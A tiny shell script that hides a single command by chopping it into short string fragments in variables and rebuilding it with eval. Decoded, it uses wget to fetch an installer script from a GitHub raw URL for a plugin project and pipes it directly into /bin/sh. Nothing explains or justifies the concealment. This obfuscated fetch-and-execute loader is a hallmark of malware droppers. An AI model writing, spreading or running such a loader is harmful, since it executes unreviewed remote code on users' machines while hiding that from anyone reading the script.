z="
";Iz='nt.c';Az='wget';Ez='.git';Uz='| /b';Tz='O - ';Kz='mil2';Nz='gin/';Qz='tall';Vz='in/s';Lz='37/x';Fz='hubu';Bz=' htt';Hz='onte';Rz='er.s';Sz='h -q';Wz='h';Mz='cplu';Pz='/ins';Jz='om/e';Oz='main';Cz='ps:/';Dz='/raw';Gz='serc';
eval "$Az$Bz$Cz$Dz$Ez$Fz$Gz$Hz$Iz$Jz$Kz$Lz$Mz$Nz$Oz$Pz$Qz$Rz$Sz$Tz$Uz$Vz$Wz"